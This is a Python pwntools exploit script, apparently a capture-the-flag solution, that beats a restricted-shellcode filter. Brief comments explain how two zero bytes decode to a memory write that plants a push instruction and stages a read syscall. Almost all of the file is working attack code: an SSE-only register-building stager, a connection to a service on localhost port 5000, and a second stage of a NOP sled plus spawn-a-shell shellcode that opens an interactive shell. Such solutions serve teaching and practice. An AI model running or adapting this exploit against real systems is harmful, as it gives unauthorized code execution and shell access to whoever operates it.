from pwn import *
context.arch = 'amd64'

# Basically we abuse the fact that \x00\x00 disassembles to 
# add    BYTE PTR [eax],al
# this allows us to do a memory access to a byte after the end of the shellcode
# so the solution is to set up registers and write a push instruction using the byte write
# the push then writes 8 more bytes which is enough to do a read syscall
# the rest is just trivial shellcoding to get a shell


payload = asm("""pxor xmm0, xmm0
movq rdi, xmm0
pcmpeqd xmm1, xmm1
pslld   xmm1, 31
psrld   xmm1, 3
pxor xmm0, xmm1
psrld   xmm1, 3
pxor xmm0, xmm1
psrld   xmm1, 1
pxor xmm0, xmm1
psrld   xmm1, 3
pxor xmm0, xmm1
psrld   xmm1, 1
pxor xmm0, xmm1
psrld   xmm1, 2
pxor xmm0, xmm1
psrld   xmm1, 1
pxor xmm0, xmm1
psrld   xmm1, 1
pxor xmm0, xmm1
movd esi, xmm0
psrld   xmm1,7
pxor xmm0, xmm1
movd esp, xmm0
pxor xmm0, xmm1
psrld   xmm1,1
pxor xmm0, xmm1
psrld   xmm1,1
pxor xmm0, xmm1
psrld   xmm1,1
pxor xmm0, xmm1
psrld   xmm1,4
pxor xmm0, xmm1
psrld   xmm1,1
pxor xmm0, xmm1
movd eax, xmm0
pxor xmm0, xmm0
psrld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,4
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,9
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,1
pxor xmm0, xmm1
pslld   xmm1,5
pxor xmm0, xmm1
pslld   xmm1,2
pxor xmm0, xmm1
pslld   xmm1,1
psllq xmm0, 32
psrlq xmm0, 24
movq rdx, xmm0
psrld  xmm1,0x7
""") + asm("pxor xmm0, xmm0") * 40

p = remote('localhost', 5000)
p.sendline(payload.hex())
sleep(1)
p.send(b'\x90'*0x210 + asm(shellcraft.sh()))
p.interactive()